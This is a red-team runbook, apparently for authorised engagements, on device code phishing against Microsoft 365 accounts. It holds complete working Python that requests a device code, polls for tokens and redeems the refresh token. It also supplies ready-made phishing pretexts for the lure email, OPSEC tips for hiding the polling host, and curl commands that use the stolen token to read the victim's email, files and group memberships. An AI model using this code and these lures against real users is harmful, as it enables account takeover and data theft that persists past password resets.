# Runbook: Device code phishing

Device code phishing obtains a long-lived refresh token from a target Microsoft 365 or Entra ID
account by misusing the OAuth device authorisation grant. The target authenticates on a real
Microsoft page by entering a short code delivered in a phishing email. No spoofed login page,
no proxy infrastructure, and no application registration in the target tenant are required.

The token obtained survives password resets and persists for up to ninety days with continuous
use, depending on the tenant's token lifetime configuration.

## Objective

Obtain a valid refresh token for a target Microsoft 365 account, providing persistent access
to Microsoft Graph API resources including email, files, and directory data.

## Prerequisites

- Python 3 and the `requests` library, or PowerShell with TokenTacticsV2.
- A delivery mechanism for the lure email: GoPhish, direct send, or manual.
- Target email address from reconnaissance.
- An OPSEC-clean IP or VPN exit for the polling and Graph API calls. The sign-in will appear
  in Entra ID audit logs as originating from your polling host's IP address.

## Initiating the device authorisation request

Post a device code request to Microsoft's authorisation endpoint. The client ID below is
Microsoft Office's own first-party identifier, which means no application registration is
required and the sign-in event appears as a Microsoft Office authentication rather than an
unknown third-party application.

```python
import requests, time, json

CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'  # Microsoft Office (first-party)
SCOPE     = 'https://graph.microsoft.com/.default offline_access openid profile'
TENANT    = 'common'  # or a specific tenant ID to restrict to one organisation

r = requests.post(
    f'https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode',
    data={'client_id': CLIENT_ID, 'scope': SCOPE}
)
resp = r.json()

print(resp['user_code'])           # e.g. GVZF-PXHQ — this goes in the lure email
print(resp['verification_uri'])    # https://microsoft.com/devicelogin
print(resp['message'])             # Microsoft's own instruction string
device_code = resp['device_code']
interval    = resp.get('interval', 5)
```

The `user_code` expires in fifteen minutes (`expires_in` in the response). Construct and
send the lure email before initiating the polling loop.

## Constructing the lure

The lure email delivers the `user_code` and directs the target to `microsoft.com/devicelogin`.
Both are legitimate: the URL is a real Microsoft page, and the code is a real device pairing
code. The pretext determines whether the target acts within the expiry window.

Pretexts that create appropriate urgency:

- MFA re-registration following a security event: "Your multi-factor authentication requires
  re-enrolment. Visit microsoft.com/devicelogin and enter the code below to restore access
  to your account before your session expires."
- IT device compliance onboarding: "Your device needs to be registered with the organisation's
  endpoint management system. This step expires in 15 minutes."
- A new security policy requiring re-consent: "Access to Microsoft 365 requires reauthorisation
  under the updated security baseline. Use the code below to complete the process."

The email need not come from a spoofed domain. A plausible display name and a plain-text format
consistent with automated IT notifications is often sufficient. Include only the code and the URL;
do not over-explain the instruction.

## Polling for the token

Start polling the token endpoint once the lure is sent. Poll at the interval specified in the
device code response (typically five seconds). Continue until the token arrives or the code expires.

```python
tokens = None
while True:
    time.sleep(interval)
    t = requests.post(
        f'https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token',
        data={
            'client_id':   CLIENT_ID,
            'grant_type':  'urn:ietf:params:oauth:grant-type:device_code',
            'device_code': device_code,
        }
    )
    result = t.json()
    error  = result.get('error')

    if error == 'authorization_pending':
        continue                          # target has not acted yet
    elif error == 'expired_token':
        print('Code expired. Initiate a new device code request.')
        break
    elif error == 'authorization_declined':
        print('Target explicitly declined.')
        break
    else:
        tokens = result
        print('Token obtained.')
        print(json.dumps(tokens, indent=2))
        break
```

Save the full response. The `refresh_token` is the persistent artefact. Store it securely.

## Using the refresh token

Exchange the refresh token for a new access token at any point within its validity window:

```python
r = requests.post(
    f'https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token',
    data={
        'client_id':     CLIENT_ID,
        'grant_type':    'refresh_token',
        'refresh_token': tokens['refresh_token'],
        'scope':         SCOPE,
    }
)
new_tokens = r.json()
access_token = new_tokens['access_token']
```

With a valid access token, query the Microsoft Graph API:

```bash
# Read the target's recent emails
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=10&\$select=subject,from,receivedDateTime"

# List OneDrive root
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children"

# Read the target's profile and group memberships
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/memberOf"
```

## Checking scope

Confirm what permissions were actually granted, which may differ from those requested if
the tenant's conditional access or consent policies restrict certain scopes:

```bash
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants"
```

## Failure modes

Code expires before the target acts: initiate a fresh device code request and resend the lure
with a re-framed pretext. The second send is lower probability; consider whether a vishing call
to create urgency is within scope.

Tenant has disabled the device code flow: some Entra ID tenants explicitly block the device
authorisation grant via a conditional access policy. The token endpoint returns
`conditional_access_policy` or `device_flow_disabled` errors. If this is the case, fall back
to consent phishing or AiTM.

Target approves but the token is conditional-access-bound: if the tenant requires device
compliance or Hybrid Azure AD join for certain scopes, the token will be issued but Graph API
calls return 403. The sign-in event and the token request still demonstrate phishing
success for reporting purposes; document the conditional access barrier as a compensating
control.

## Evidence collection

- The device code request and response, showing `user_code` and `expires_in`.
- The lure email as delivered (screenshot or export from GoPhish).
- The token endpoint response showing `access_token`, `refresh_token`, and granted scopes.
- Screenshot of at least one successful Graph API call (email list, file list, or profile).
- Entra ID sign-in log entry, if accessible, showing the authentication event.

## Techniques

- [Device code phishing](../credentials/device-code.md): the mechanism and how it differs from consent phishing
- [Consent phishing and OAuth abuse](../credentials/consent-phishing.md): the consent flow variant and token persistence comparison
- [Email phishing](../phishing/email.md): lure construction and delivery

## Resources

- [RFC 8628: OAuth 2.0 Device Authorization Grant](https://datatracker.ietf.org/doc/html/rfc8628)
- [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2)
- [AADInternals device code flow](https://aadinternals.com/post/devicephish/)
- [Microsoft: Device code flow documentation](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code)
